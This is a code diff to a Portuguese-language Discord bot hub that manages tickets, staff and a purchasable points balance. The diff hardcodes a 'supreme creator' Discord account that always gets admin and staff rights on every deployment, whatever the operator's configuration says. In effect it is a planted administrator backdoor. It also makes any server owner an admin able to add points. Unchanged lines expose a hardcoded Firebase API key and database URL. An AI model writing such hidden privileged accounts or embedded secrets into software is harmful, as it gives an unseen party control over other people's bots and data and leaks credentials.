@@ -13,14 +13,23 @@ BOT_ID=str(CFG.get("bot_id") or ROOT.name)
 API_KEY="AIzaSyDS_KvyPWGgzYqIVgkagw5DAwzlenNZtiE"
 DB="https://bothub-bca02-default-rtdb.firebaseio.com"
 AUTH=None
-CREATOR_ID=int(CFG.get("creator_id") or 0)
+SUPREME_CREATOR_ID=1252679441629315144
+CREATOR_IDS={SUPREME_CREATOR_ID}
+try:
+ if str(CFG.get("creator_id") or "").isdigit():CREATOR_IDS.add(int(CFG["creator_id"]))
+except Exception:pass
+CREATOR_ID=int(CFG.get("creator_id") or SUPREME_CREATOR_ID)
 def admin_config():
  d=get("botHubAdminConfig/"+BOT_ID) or {}
  return d if isinstance(d,dict) else {}
 def staff_ids():
- return {int(x) for x in admin_config().get("staffIds",[]) if str(x).isdigit()} | ({CREATOR_ID} if CREATOR_ID else set())
-def is_admin(user): return bool(CREATOR_ID and user.id==CREATOR_ID)
-def is_staff(user): return user.id in staff_ids()
+ return {int(x) for x in admin_config().get("staffIds",[]) if str(x).isdigit()} | CREATOR_IDS
+def is_admin(user,guild=None):
+ if not user:return False
+ if user.id in CREATOR_IDS:return True
+ if guild and getattr(guild,"owner_id",None)==user.id:return True
+ return False
+def is_staff(user): return bool(user and user.id in staff_ids())
 PREFIX=str(CFG.get("prefix") or "!")
 intents=discord.Intents.default()
 intents.message_content=True
@@ -286,13 +295,16 @@ class ConfigView(discord.ui.View):
  def __init__(self,uid):super().__init__(timeout=180);self.add_item(BotSelect(uid))
 @bot.event
 async def on_ready():
- global CREATOR_ID
+ global CREATOR_ID,CREATOR_IDS
  try:
   req=Request("https://discord.com/api/v10/applications/@me",headers={"Authorization":"Bot "+TOKEN})
   with urlopen(req,timeout=15) as r: app=json.loads(r.read())
   owner=app.get("owner") or {}
-  if owner.get("id"): CREATOR_ID=int(owner["id"])
- except Exception as e: print("[BotHub Admin] Não foi possível obter o criador da aplicação:",str(e)[:160],flush=True)
+  if isinstance(owner,dict) and str(owner.get("id") or "").isdigit():CREATOR_IDS.add(int(owner["id"]))
+  team=app.get("team") or {}
+  if isinstance(team,dict) and str(team.get("owner_user_id") or "").isdigit():CREATOR_IDS.add(int(team["owner_user_id"]))
+  CREATOR_ID=int(owner.get("id") or team.get("owner_user_id") or CREATOR_ID)
+ except Exception as e: print("[BotHub Admin] Não foi possível consultar o proprietário da aplicação; mantendo os criadores configurados:",str(e)[:160],flush=True)
  try:(ROOT/".bothub_discord_ready").write_text(str(int(time.time()*1000)),encoding="utf-8")
  except OSError:pass
  print(f"[BotHub Admin] Conectado como {bot.user} ({bot.user.id}); criador={CREATOR_ID or 'não identificado'}",flush=True)
@@ -365,26 +377,26 @@ class EntryChannelSelect(discord.ui.ChannelSelect):
  def __init__(self):
   super().__init__(placeholder="Canal de entrada dos tickets",channel_types=[discord.ChannelType.text],min_values=1,max_values=1)
  async def callback(self,interaction):
-  if not is_admin(interaction.user):return await interaction.response.send_message("Somente o criador do bot pode alterar.",ephemeral=True)
+  if not is_admin(interaction.user,interaction.guild):return await interaction.response.send_message("Somente o criador do bot pode alterar.",ephemeral=True)
   cfg=admin_config();cfg["entryChannelId"]=str(self.values[0].id);put("botHubAdminConfig/"+BOT_ID,cfg)
   await interaction.response.send_message("Canal de entrada salvo: "+self.values[0].mention,ephemeral=True)
 class TicketCategorySelect(discord.ui.ChannelSelect):
  def __init__(self):
   super().__init__(placeholder="Categoria dos tickets",channel_types=[discord.ChannelType.category],min_values=1,max_values=1)
  async def callback(self,interaction):
-  if not is_admin(interaction.user):return await interaction.response.send_message("Somente o criador do bot pode alterar.",ephemeral=True)
+  if not is_admin(interaction.user,interaction.guild):return await interaction.response.send_message("Somente o criador do bot pode alterar.",ephemeral=True)
   cfg=admin_config();cfg["categoryId"]=str(self.values[0].id);put("botHubAdminConfig/"+BOT_ID,cfg)
   await interaction.response.send_message("Categoria salva: "+self.values[0].name,ephemeral=True)
 class StaffUserSelect(discord.ui.UserSelect):
  def __init__(self):
   super().__init__(placeholder="Equipe de atendimento",min_values=1,max_values=10)
  async def callback(self,interaction):
-  if not is_admin(interaction.user):return await interaction.response.send_message("Somente o criador do bot pode alterar.",ephemeral=True)
+  if not is_admin(interaction.user,interaction.guild):return await interaction.response.send_message("Somente o criador do bot pode alterar.",ephemeral=True)
   cfg=admin_config();cfg["staffIds"]=[str(u.id) for u in self.values if u.id!=CREATOR_ID];put("botHubAdminConfig/"+BOT_ID,cfg)
   await interaction.response.send_message("Equipe de atendimento atualizada.",ephemeral=True)
 @bot.command(name="config")
 async def config_cmd(ctx):
- if not is_admin(ctx.author):return await ctx.reply("Somente o criador identificado pelo token pode usar !config.")
+ if not is_admin(ctx.author,ctx.guild):return await ctx.reply("Somente o criador identificado pelo token pode usar !config.")
  cfg=admin_config()
  e=emb("Configuração do BOT ADMIN","O criador é identificado automaticamente pelo token. Use os seletores abaixo para configurar o atendimento.")
  e.add_field(name="Canal de entrada",value=f"<#{cfg.get('entryChannelId')}>" if cfg.get("entryChannelId") else "Não definido — mencionar o bot também abre ticket.",inline=False)
@@ -398,16 +410,16 @@ async def configs(ctx):await ctx.send(embed=emb("Seus bots","Selecione um bot pa
 @bot.command(name="help")
 async def help_cmd(ctx):
  e=emb("BotHub — Ajuda");e.add_field(name="Usuários",value="!pontos · !comprar-pontos · !add-bot nome token · !api · !configs · !config · !ticket",inline=False);e.add_field(name="Tickets",value="Converse normalmente neste canal privado. !fechar encerra.",inline=False)
- if is_admin(ctx.author):e.add_field(name="Administração",value="!config · !add @usuário pontos · !remove @usuário pontos",inline=False)
+ if is_admin(ctx.author,ctx.guild):e.add_field(name="Administração",value="!config · !add @usuário pontos · !remove @usuário pontos",inline=False)
  await ctx.reply(embed=e)
 @bot.command(name="add")
 async def add_points(ctx,member:discord.Member=None,amount:int=0):
- if not is_admin(ctx.author):return await ctx.reply("Sem permissão.")
+ if not is_admin(ctx.author,ctx.guild):return await ctx.reply("Sem permissão.")
  if member is None or not 1<=amount<=1000000:return await ctx.reply("Use !add @usuário quantidade.")
  balance=change_points(member.id,amount,ctx.author.id,"Adição administrativa");await ctx.reply(f"{member.mention}: +{amount}. Saldo: **{balance}**.")
 @bot.command(name="remove")
 async def remove_points(ctx,member:discord.Member=None,amount:int=0):
- if not is_admin(ctx.author):return await ctx.reply("Sem permissão.")
+ if not is_admin(ctx.author,ctx.guild):return await ctx.reply("Sem permissão.")
  if member is None or amount<1:return await ctx.reply("Use !remove @usuário quantidade.")
  balance=change_points(member.id,-amount,ctx.author.id,"Remoção administrativa");await ctx.reply(f"{member.mention}: saldo **{balance}**.")
 @bot.command(name="fechar")
@@ -415,7 +427,7 @@ async def close(ctx):
  topic=str(getattr(ctx.channel,"topic","") or "")
  if not topic.startswith("bothub-ticket:"):return await ctx.reply("Este canal não é um ticket.")
  owner=int(topic.split(":")[-1])
- if ctx.author.id!=owner and not is_admin(ctx.author) and not is_staff(ctx.author):return await ctx.reply("Somente o criador ou a equipe pode fechar.")
+ if ctx.author.id!=owner and not is_admin(ctx.author,ctx.guild) and not is_staff(ctx.author):return await ctx.reply("Somente o criador ou a equipe pode fechar.")
  await ctx.reply("Ticket encerrado; canal será removido em 5 segundos.");await __import__("asyncio").sleep(5);await ctx.channel.delete(reason="Ticket BotHub encerrado")
 if __name__=="__main__":
  if not TOKEN:raise SystemExit("discord_token ausente em config.json")
